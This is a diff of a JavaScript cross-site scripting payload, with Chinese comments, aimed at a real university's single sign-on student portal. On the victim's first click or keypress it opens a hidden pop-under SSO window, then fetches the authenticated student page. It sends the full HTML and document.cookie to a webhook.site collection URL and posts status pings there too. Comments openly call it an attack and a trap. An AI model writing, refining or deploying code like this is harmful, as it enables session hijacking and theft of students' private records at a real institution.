@@ -1,42 +1,47 @@
 (async () => {
     const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
     const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
-    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; // 或 index.do
+    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; 
 
-    // 定義攻擊函數
+    // 定義攻擊函數：只有在使用者點擊時才執行
     async function launchAttack() {
-        // 1. 移除監聽器 (確保只觸發一次)
+        // 1. 移除監聽器，確保只跑一次
         document.removeEventListener('click', launchAttack);
+        document.removeEventListener('keydown', launchAttack);
         
         try {
-            // 2. 觸發彈窗 (現在是在點擊事件中，Edge 不會擋！)
-            // 使用 Pop-under 技巧 (縮小 + 失去焦點)
+            // 2. 在點擊事件內觸發彈窗 (瀏覽器會放行！)
+            // 嘗試做成 Pop-under (縮小 + 移開 + 失去焦點)
             const popup = window.open(ssoUrl, "sso_trap", "width=100,height=100,left=9999,top=9999");
             
             if (popup) {
-                try { popup.blur(); window.focus(); } catch(e) {} // 嘗試踢到後台
-                fetch(webhook + "?step=Popup_Launched_By_Click");
+                // 嘗試讓彈窗躲到後面去
+                try { popup.blur(); window.focus(); } catch(e) {}
+                fetch(webhook + "?step=Popup_Launched_Success");
             } else {
-                fetch(webhook + "?error=Still_Blocked_WTF");
+                fetch(webhook + "?error=Popup_Still_Blocked");
                 return;
             }
 
-            // 3. 等待 SSO 完成
+            // 3. 等待 SSO 完成 (6秒)
             await new Promise(r => setTimeout(r, 6000));
 
             // 4. 關閉彈窗
             try { popup.close(); } catch(e) {}
 
-            // 5. 收割資料
+            // 5. 收割完整資料
             const response = await fetch(targetUrl);
-            const html = await response.text();
+            const fullHtml = await response.text();
 
             fetch(webhook, {
                 method: 'POST',
                 mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    msg: "Click-Triggered Attack Success",
-                    html_content: html.substring(0, 5000), // 內容
+                    msg: "FULL_DUMP_SUCCESS",
+                    trigger: "User_Click",
+                    status: response.status,
+                    full_html_source: fullHtml, // 這裡是你需要的完整原始碼
                     cookies: document.cookie
                 })
             });
@@ -46,14 +51,12 @@
         }
     }
 
-    // === 埋伏 ===
-    // 監聽整個文件的點擊事件
+    // === 佈署陷阱 ===
+    // 監聽全域點擊事件，只要受害者點任何地方就會觸發
     document.addEventListener('click', launchAttack);
-    
-    // 如果使用者是透過鍵盤操作，也可以監聽 keydown
     document.addEventListener('keydown', launchAttack);
 
-    // 回報：陷阱已佈署
-    fetch(webhook + "?status=Trap_Set_Waiting_For_Click");
+    // 通知你陷阱已就緒
+    fetch(webhook + "?status=Trap_Ready_Waiting_For_Click");
 
 })();
